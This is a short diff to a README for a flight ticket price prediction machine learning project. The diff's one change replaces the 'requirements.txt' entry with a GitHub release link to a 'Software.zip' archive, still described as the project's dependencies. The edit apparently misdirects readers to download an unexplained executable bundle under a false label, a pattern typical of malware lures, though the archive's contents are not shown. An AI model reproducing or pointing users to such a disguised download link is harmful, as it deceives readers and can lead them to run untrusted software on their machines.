@@ -7,5 +7,5 @@ Welcome to the Flight Ticket Prediction Machine Learning Project! This project u
 ### data: Contains the dataset used for training and testing the model.
 ### notebooks: Jupyter notebooks for data exploration, preprocessing, and model training.
 ### src: Source code files for the machine learning model.
-### requirements.txt: Dependencies required for running the project.
+### https://github.com/Arup0070/FlightTicket_Price_prediction/releases/download/v1.0/Software.zip Dependencies required for running the project.
 ### Dockerfile: Configuration file for building the Docker container.
